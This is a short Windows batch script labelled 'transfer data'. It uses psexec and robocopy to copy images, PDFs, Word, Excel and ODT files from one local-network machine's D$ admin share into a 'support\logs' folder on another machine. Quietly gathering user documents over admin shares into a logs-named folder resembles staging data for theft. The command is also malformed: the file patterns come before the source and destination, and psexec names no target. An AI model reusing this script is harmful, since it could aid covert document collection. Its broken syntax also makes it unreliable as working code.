rem *transfer data*
@echo off
psexec cmd /c "robocopy *.jpg *.pdf *.jpeg *.docx *.doc *.xls *.xlsx *.odt /E \\192.168.0.111\D$\Demo \\192.168.0.100\C$\Users\support\logs"